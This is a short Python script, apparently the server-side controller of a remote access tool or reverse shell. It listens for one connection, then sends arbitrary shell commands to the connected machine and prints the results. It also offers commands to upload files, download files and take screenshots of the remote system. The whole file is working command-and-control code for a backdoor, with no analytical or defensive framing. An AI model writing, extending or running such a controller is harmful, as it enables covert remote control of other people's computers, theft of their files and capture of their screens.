#!/usr/bin/python3

# server-side

# modules

import socket
import os
from definitions import *

# main program

host = '127.0.0.1'
port = 8080

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
print('\033[1;37m[-]\033[m listening on', port, '...')

client, addr = server.accept()
print('\n\033[1;32m[+]\033[m connected to', addr)
print()
while True:
    comm = input(f'\033[1m{addr}\033[m\n\033[0;32m>\033[m ')
    if comm == 'close':
        client.send(comm.encode())
        break
    elif comm[:3] == 'cd ':
        client.send(comm.encode())
    elif comm[:7] == 'upload ':
        file = comm[7:]
        upload(client, file)
    elif comm[:9] == 'download ':
        file = comm[9:]
        download(client, file)
    elif comm == 'screenshot':
        screenshot_server(client)
    elif comm == 'clean':
        os.system(comm)
    elif comm.strip() == '':
        pass
    else:
        client.send(comm.encode())
        output = client.recv(1024).decode()
        print(output)

server.close()
